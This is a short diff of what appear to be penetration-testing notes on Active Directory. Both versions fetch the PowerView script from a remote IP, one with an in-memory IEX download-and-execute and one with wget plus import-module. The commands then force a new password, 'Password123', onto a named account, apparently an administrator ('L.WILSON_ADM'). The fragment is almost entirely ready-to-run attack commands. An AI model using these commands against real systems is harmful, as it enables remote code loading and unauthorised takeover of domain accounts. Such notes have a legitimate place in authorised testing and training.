@@ -23,10 +23,10 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $UserPassword -Cr
 #### PowerShell if logged into account
 
 ```bash
-IEX(New-Object Net.WebClient).downloadString('http://192.168.58.50/PowerView.ps1')  
+wget http://10.10.15.107/PowerView.ps1 -o PowerView.ps1
+import-module .\PowerView.ps1
 $NewPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force 
-
-Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword   
+Set-DomainUserPassword -Identity 'L.WILSON_ADM' -AccountPassword $NewPassword  
 ```
 #### BloodyAD
 
